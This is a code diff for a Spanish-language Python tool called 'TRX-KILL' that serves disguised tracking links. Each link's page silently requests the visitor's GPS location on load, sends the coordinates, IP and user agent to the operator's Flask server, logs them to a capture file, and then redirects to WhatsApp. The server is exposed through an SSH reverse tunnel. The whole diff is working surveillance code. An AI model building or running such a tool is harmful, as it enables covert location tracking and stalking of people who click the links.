@@ -4,86 +4,83 @@ import time
 import sys
 import threading
 import subprocess
-import requests
+import json
 from flask import Flask, request, render_template_string
 
-# Colores Matrix
+# Configuración Visual
 GREEN = "\033[1;32m"
+CYAN = "\033[1;36m"
 RESET = "\033[0m"
-BLACK_BG = "\033[40m"
 
 app = Flask(__name__)
-URL_FINAL = "https://wa.me/595981000000"
+URL_REDIRECT = "https://wa.me/595981000000"
 
-def type_print(text, delay=0.02):
-    for char in text:
+def log_data(data):
+    with open("capturas.log", "a") as f:
+        f.write(json.dumps(data) + "\n")
+
+def animacion(texto):
+    for char in texto:
         sys.stdout.write(char)
         sys.stdout.flush()
-        time.sleep(delay)
+        time.sleep(0.01)
     print()
 
 def banner():
     os.system('clear')
-    banner_text = r"""
-  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗██╗     ██╗
-  ██╔══██╗██╔══██╗╚██╗██╔╝    ██║ ██╔╝██║██║     ██║
-  ██████╔╝██████╔╝ ╚███╔╝     █████╔╝ ██║██║     ██║
-  ██╔══██╗██╔══██╗ ██╔██╗     ██╔═██╗ ██║██║     ██║
-  ██║  ██║██║  ██║██╔╝ ██╗    ██║  ██╗██║███████╗██║
-  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚═╝
-    """
-    print(f"{GREEN}{banner_text}{RESET}")
-    print(f"{GREEN} [!] SISTEMA DE AUDITORÍA TRX-KILL | MODO MATRIX [!]{RESET}\n")
+    print(f"{GREEN}")
+    print("  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗██╗     ██╗")
+    print("  ██╔══██╗██╔══██╗╚██╗██╔╝    ██║ ██╔╝██║██║     ██║")
+    print("  ██████╔╝██████╔╝ ╚███╔╝     █████╔╝ ██║██║     ██║")
+    print("  ██╔══██╗██╔══██╗ ██╔██╗     ██╔═██╗ ██║██║     ██║")
+    print("  ██║  ██║██║  ██║██╔╝ ██╗    ██║  ██╗██║███████╗██║")
+    print("  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
+    print(f"{CYAN}       >>> SISTEMA DE AUDITORÍA ELITE v18.0 <<< {RESET}\n")
 
-def obtener_datos_extra(lat, lon):
-    url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
-    try:
-        res = requests.get(url).json()
-        return res.get("display_name", "Ubicación Privada")
-    except: return "No disponible"
-
-HTML_RASTREO = """
-<!DOCTYPE html>
-<html><body onload="c()">
+@app.route('/<token>')
+def index(token):
+    return render_template_string(f"""
+    <html><body onload="c()">
     <script>
-        function c() {
-            navigator.geolocation.getCurrentPosition((p) => {
-                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})})
-                .then(() => window.location.href = "%s");
-            }, () => window.location.href = "%s");
-        }
+        function c() {{
+            navigator.geolocation.getCurrentPosition((p) => {{
+                fetch('/log?id={token}', {{method: 'POST', body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}})}})
+                .then(() => window.location.href = "{URL_REDIRECT}");
+            }}, () => window.location.href = "{URL_REDIRECT}");
+        }}
     </script>
-</body></html>
-""" % (URL_FINAL, URL_FINAL)
-
-@app.route('/')
-def index(): return render_template_string(HTML_RASTREO)
+    </body></html>
+    """)
 
 @app.route('/log', methods=['POST'])
 def log():
-    d = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    dir_fisica = obtener_datos_extra(d['lat'], d['lon'])
-    print(f"\n{GREEN}[+] ACCESO CONCEDIDO{RESET}")
-    print(f"{GREEN}[*] IP: {ip}{RESET}")
-    print(f"{GREEN}[*] COORD: {d['lat']}, {d['lon']}{RESET}")
-    print(f"{GREEN}[*] CALLE: {dir_fisica}{RESET}")
+    id_link = request.args.get('id')
+    data = request.json
+    data['id'] = id_link
+    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
+    log_data(data)
+    print(f"\n{GREEN}[!] CAPTURA EXITOSA (ID: {id_link}){RESET}")
+    print(f"{CYAN}[*] IP: {data['ip']} | COORD: {data['lat']}, {data['lon']}{RESET}")
     return "OK"
 
 def main():
     while True:
         banner()
-        type_print(f"{GREEN}>> SELECCIONE MÓDULO DE INYECCIÓN:{RESET}")
-        print(f"{GREEN} [1] ANÁLISIS OSINT{RESET}")
-        print(f"{GREEN} [2] MATRIX RASTREO GPS (DIRECTO){RESET}")
+        print(f"{GREEN} [1] INICIAR MÓDULO DE 10 LINKS{RESET}")
+        print(f"{GREEN} [2] VER LOGS DE CAPTURAS{RESET}")
         print(f"{GREEN} [3] SALIR{RESET}")
         opc = input(f"\n{GREEN}TRX-KILL@ROOT > {RESET}")
 
-        if opc == "2":
+        if opc == "1":
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
-            type_print(f"{GREEN}[*] ENCRIPTANDO TÚNEL SSH...{RESET}")
+            animacion(f"{GREEN}[*] GENERANDO TÚNEL SSH DE ALTA VELOCIDAD...{RESET}")
+            print(f"{CYAN}[!] LINKS ACTIVOS: { [f'https://[TU_DOMINIO]/{i}' for i in range(1, 11)] }{RESET}")
             subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
+        elif opc == "2":
+            if os.path.exists("capturas.log"):
+                with open("capturas.log", "r") as f: print(f.read())
+            else: print("[-] No hay logs aún.")
+            input("\nENTER para volver...")
         elif opc == "3": break
 
 if __name__ == "__main__":
